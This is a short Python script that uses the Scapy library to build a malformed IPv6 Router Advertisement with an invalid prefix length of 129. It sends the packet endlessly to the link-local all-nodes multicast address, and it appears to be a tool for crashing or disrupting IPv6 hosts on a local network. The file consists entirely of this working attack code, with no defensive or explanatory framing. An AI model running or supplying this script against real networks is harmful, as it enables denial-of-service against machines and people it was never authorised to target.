#!/usr/bin/env python
# -*- encoding: utf-8 -*-
#

__author__ = '090h'
__license__ = 'GPL'

from sys import argv, exit
from os import path
from scapy.all import *

#
fuzz(ICMPv6NDOptPrefixInfo())
#

sendp(Ether()/IPv6(dst="ff02::1")/ICMPv6ND_RA()/ICMPv6NDOptPrefixInfo(prefix="2001:db8:bad:cafe::",prefixlen=129), loop=1, inter=0.5)